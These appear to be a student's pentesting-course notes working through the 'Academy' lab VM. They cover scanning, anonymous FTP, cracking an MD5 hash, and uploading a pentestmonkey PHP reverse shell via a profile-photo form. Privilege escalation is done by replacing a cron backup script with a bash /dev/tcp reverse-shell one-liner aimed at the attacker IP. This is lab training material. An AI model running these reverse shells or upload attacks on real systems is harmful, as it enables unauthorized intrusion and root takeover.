**Acadamy**
Creds for set up<br/>
root<br/>
tcm<br/>
<br/>
For this machine. part of set up need to log in and run dhclient. This will enable ip address<br/>
<br/>
Victim IP - 192.168.247.131<br/>
<br/>
arp scan confirm <br/>
192.168.247.131<br/>
<br/>
NMAP<br/>
<br/>
┌──(kali㉿kali)-[~]<br/>
└─$ nmap -T4 -p- -A 192.168.247.131  <br/>
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-01 05:21 EST<br/>
Nmap scan report for 192.168.247.131<br/>
Host is up (0.00055s latency).<br/>
Not shown: 65532 closed tcp ports (conn-refused)<br/>
PORT  STATE SERVICE VERSION<br/>
21/tcp open ftp   vsftpd 3.0.3<br/>
| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br/>
|_-rw-r--r--  1 1000   1000     776 May 30 2021 note.txt<br/>
| ftp-syst: <br/>
|  STAT: <br/>
| FTP server status:<br/>
|   Connected to ::ffff:192.168.247.128<br/>
|   Logged in as ftp<br/>
|   TYPE: ASCII<br/>
|   No session bandwidth limit<br/>
|   Session timeout in seconds is 300<br/>
|   Control connection is plain text<br/>
|   Data connections will be plain text<br/>
|   At session startup, client count was 4<br/>
|   vsFTPd 3.0.3 - secure, fast, stable<br/>
|_End of status<br/>
22/tcp open ssh   OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br/>
| ssh-hostkey: <br/>
|  2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)<br/>
|  256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)<br/>
|_ 256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)<br/>
80/tcp open http  Apache httpd 2.4.38 ((Debian))<br/>
|_http-title: Apache2 Debian Default Page: It works<br/>
|_http-server-header: Apache/2.4.38 (Debian)<br/>
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br/>
<br/>
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds<br/>
                               <br/>
<br/>
ENUMERATION<br/>
<br/>
Strategy &gt; port 22 Cut it away. generally just a bruteforce attack ont he password. In CTFs this is not ususally the right answer.<br/>
In IRL pentest, you can/should test. You are testing password strenght, for defaults and to see if blue team can detect it.<br/>
<br/>
21/tcp open ftp   vsftpd 3.0.3<br/>
ftp-anon: Anonymous FTP login allowed (FTP code 230)<br/>
note.txt<br/>
Pri 1 - Whats in the note!<br/>
ftp as anonymous<br/>
<br/>
Syntax &gt; ftp &lt;ip&gt; <br/>
<br/>
<br/>
<img height="250" src="image.png" width="830"/><br/>
<br/>
Download the file. Depending on how the ftp is configured, further attacks could including uploading and executing a malicious file.<br/>
<br/>
NOTE CONTENTS<br/>
<br/>
Hello Heath !<br/>
Grimmie has setup the test website for the new academy.<br/>
I told him not to use the same password everywhere, he will change it ASAP.<br/>
<br/>
<br/>
I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:<br/>
<br/>
INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES<br/>
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');<br/>
<br/>
The StudentRegno number is what you use for login.<br/>
<br/>
<br/>
Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?<br/>
We can always adapt it to our needs.<br/>
<br/>
-jdelta<br/>
<br/>
END NOTE CONTENTS (well that looks like credentials!)<br/>
<br/>
UID - 10201321 <br/>
<br/>
pwd - cd73502828457d15655bbd7a63fb0bc8 (google) = student<br/>
<br/>
HASH-IDENTIFIER tool built into kali could attmept to id the hash <br/>
Google will also do it<br/>
Google can also possible &quot;crack&quot; it. lots of online tools<br/>
or built into Kali (good for offline)<br/>
<br/>
HASHCAT - should be able to crack it... mine is broken ( a prob for another day)<br/>
syntax &gt; hashcat -m 0 (md5) &lt;hashfile&gt; &lt;wordlistfile&gt;<br/>
<br/>
Credentials found<br/>
- id = 10201321 <br/>
- pwd = student<br/>
- name = Rum Ham<br/>
<br/>
<br/>
22/tcp open ssh   OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br/>
Pri 3<br/>
<br/>
<br/>
80/tcp open http  Apache httpd 2.4.38 ((Debian))<br/>
|_http-title: Apache2 Debian Default Page: It works<br/>
|_http-server-header: Apache/2.4.38 (Debian)<br/>
<br/>
GO to web page &gt; its a default apache page. (This is a finding in a report,it should be down or something of value)<br/>
<br/>
<br/>
<img height="200" src="image 2.png" width="501"/><br/>
<br/>
<img height="200" src="image 3.png" width="440"/><br/>
404 information is another finding. version information<br/>
<br/>
<br/>
Dirbusting!<br/>
<br/>
We have credentails and port 80 open. Credentails are for a 'new site' acadamy? maybe they got together. ALways directory bust a website.<br/>
<br/>
dirb, dirbuster or new tool FFUF<br/>
<br/>
install ffuf<br/>
<br/>
syntax &gt; ffuf -w &lt;wordlist&gt;:FUZZ -u http:&lt;ip&gt;/FUZZ<br/>
<br/>
benefit of ffuf is quicker thatn dirb. only looks 1 level deep where dirb will look inside every directory it finds for subdirs<br/>
<br/>
<img height="300" src="image 4.png" width="725"/><br/>
<br/>
<br/>
Resulted in small list of useful results. <br/>
<br/>
Namely academy<br/>
<br/>
ATTACKING PORT 80<br/>
<br/>
<br/>
Navigate back to 192.168.247.131/academy<br/>
<br/>
presented with login request. enter captured ren no and password<br/>
<br/>
Reg no: 10201321<br/>
Password: student<br/>
<br/>
<img height="550" src="image 5.png" width="677"/><br/>
apon login you are asked to change password. &gt; this is account take over.<br/>
<br/>
can navigate around the site as desired.<br/>
<br/>
interesting tab!<br/>
<br/>
MY PROFILE TAB &gt; allows upload of files. Option for sutend to upload a profile pic. is there file type validation?<br/>
Upoload a malicuious file to open shell.<br/>
<br/>
<br/>
uplaoading image as expected works<br/>
<img src="image 6.png"/><br/>
image stored at &gt; http://192.168.247.131/academy/studentphoto/cat.jpeg<br/>
<br/>
<br/>
REVERSE SHELL<br/>
<br/>
server is php.<br/>
<br/>
google php reverse shell. First hitg pentest monkey<br/>
<br/>
https://github.com/pentestmonkey/php-reverse-shell<br/>
<br/>
copy script to new file adjust daults to match attacker machine<br/>
<br/>
<br/>
<img src="image 7.png"/><br/>
<br/>
save the file somehwere and call it shell.php<br/>
<br/>
shell script is set up. Now set up a listener<br/>
<br/>
syntax &gt; nc -nvlp 1234 (match the port you set) <br/>
<br/>
navigate back to the site and upload the malicious file<br/>
<br/>
navigate to select and update shell.php. IN this instance it ran imidiately. im some cases you will need to navigate to the script and exetue it.<br/>
<br/>
<img height="250" src="image 8.png" width="657"/><br/>
<br/>
shell executed. Not root. Time for priv esc.<br/>
<br/>
PRIVESC<br/>
<br/>
Going to use a tool to search for privesc vulneraabilites<br/>
<br/>
linPEAS<br/>
<br/>
https://github.com/carlospolop/PEASS-ng/releases/tag/20220206<br/>
<br/>
access and save the linpeas.sh file. place into a 'transfer' folder<br/>
<br/>
We are preparing to host up th efile from our machine the victim.<br/>
<br/>
host a server on the attacker in the asame location as the linpeas file<br/>
<br/>
syntax &gt; python3 -m http.server 80 <br/>
<br/>
now malicious file can be downloaded.<br/>
<br/>
move back to victim and navigate to tmp folder. minimise footprint<br/>
<br/>
<br/>
<img src="image 9.png"/><br/>
<br/>
linpease is currently not executable. use chmod +x linpeas.sh<br/>
<br/>
<img src="image 10.png"/><br/>
<br/>
run the script ./linpeas.sh<br/>
<br/>
FINDINGS<br/>
<br/>
looking for RED items<br/>
<br/>
* * * * * /home/grimmie/backup.sh<br/>
<br/>
Searching passwords in config PHP files<br/>
$cfg['Servers'][$i]['AllowNoPassword'] = false;                                                             <br/>
$cfg['Servers'][$i]['AllowNoPassword'] = false;<br/>
$cfg['Servers'][$i]['AllowNoPassword'] = false;<br/>
$cfg['ShowChgPassword'] = true;<br/>
$mysql_password = &quot;My_V3ryS3cur3_P4ss&quot;;<br/>
$mysql_password = &quot;My_V3ryS3cur3_P4ss&quot;;<br/>
<br/>
<br/>
SO mysql password... no user associated.<br/>
cat /etc/passwd isdentifed possible user for password and that they are an admin<br/>
grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash<br/>
<br/>
<br/>
═══════╣ Files inside others home (limit 20)<br/>
/home/grimmie/.bash_history                                                                       <br/>
/home/grimmie/.bashrc<br/>
/home/grimmie/backup.sh &gt;&gt;&gt;&gt; whats this!<br/>
/home/grimmie/.profile<br/>
/home/grimmie/.bash_logout<br/>
<br/>
lets try SSH as grimmie<br/>
<br/>
<img height="300" src="image 11.png" width="567"/><br/>
<br/>
<br/>
once inside, you can run linpeas.sh again to see if anything has chaanged. potential to chain exploits<br/>
<br/>
<br/>
further privesc later in course.<br/>
<br/>
In grimmie home folder is a backup script running. <br/>
grimmie@academy:~$ cat backup.sh <br/>
#!/bin/bash<br/>
<br/>
rm /tmp/backup.zip<br/>
zip -r /tmp/backup.zip /var/www/html/academy/includes<br/>
chmod 700 /tmp/backup.zip<br/>
grimmie@academy:~$ <br/>
<br/>
appears to run a periodic backup of the server... inbuilt tools to see services running does not show backup running.<br/>
Get confirmation with pspy<br/>
<br/>
https://github.com/DominicBreuker/pspy<br/>
<br/>
download and move to transfer folder. <br/>
<br/>
on grimmie cd to tmp folder and download, cghmod, then run pspy<br/>
<br/>
backup.sh runs periodically<br/>
<br/>
<img src="image 12.png"/><br/>
<br/>
we can abuse this srcipt with a 1 liner<br/>
<br/>
pentest monkey!<br/>
<br/>
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet<br/>
<br/>
bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1<br/>
<br/>
<br/>
From here modify the 1 liner to use attacker details.<br/>
<br/>
bash -i &gt;&amp; /dev/tcp/192.168.247.128/8080 0&gt;&amp;1<br/>
<br/>
open a listener in netcat<br/>
<br/>
modify the backup.sh by deleting what in there and pasting in the one liner... wait then profit<br/>
<br/>
<img src="image 13.png"/><br/>
<br/>
<br/>
Profit!<br/>
<br/>
<img src="image 14.png"/><br/>
<br/>
